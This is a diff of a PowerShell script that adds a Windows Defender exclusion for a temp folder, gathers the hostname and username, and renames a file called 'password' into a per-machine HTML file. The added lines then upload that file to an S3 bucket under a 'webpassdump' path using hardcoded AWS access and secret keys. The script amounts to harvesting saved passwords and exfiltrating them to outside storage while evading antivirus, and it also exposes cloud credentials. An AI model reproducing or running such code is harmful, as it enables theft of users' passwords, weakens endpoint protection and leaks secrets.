@@ -1,4 +1,4 @@
-﻿Add-MpPreference -ExclusionPath “C:\Windows\Temp\JuansFamousFriedChicken”
+Add-MpPreference -ExclusionPath “C:\Windows\Temp\JuansFamousFriedChicken”
 
 $Folder = 'C:\Windows\Temp\JuansFamousFriedChicken'
 
@@ -59,10 +59,19 @@ Register-PackageSource -Name Nuget -Location "http://www.nuget.org/api/v2" –Pr
 
 Install-Module -Name AWS.Tools.S3 -Force
 
-timeout 120
+timeout 20
 
 $user = $env:USERNAME
 $hostname = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName" | Select-Object -ExpandProperty ComputerName
 $File = $hostname + "-" + $user
 
 REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\ITA /v Custom2 /t REG_SZ /d "https://rmmoutputs.s3.amazonaws.com/webpassdump/$File.html" /f
+
+Remove-Item -Path C:\Windows\Temp\JuansFamousFriedChicken\$File.html -Force
+Rename-Item -Path "C:\Windows\Temp\JuansFamousFriedChicken\password" -NewName "$File.html"
+#Importing AWS Powershell Module to current sesssion
+Import-Module -Name AWS.Tools.S3
+#Setup Credential for cloud storage AWS S3
+Set-AWSCredential -AccessKey AKIAV6ZQELF5MMNU2VM3 -SecretKey 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 -StoreAs default
+Get-S3Bucket  -BucketName rmmoutputs
+Write-S3Object -BucketName "rmmoutputs" -Key "$File.html" -File "C:\Windows\Temp\JuansFamousFriedChicken\$File.html" -EndpointUrl "https://rmmoutputs.s3.amazonaws.com/webpassdump/$File.html" -Region "us-east-1"
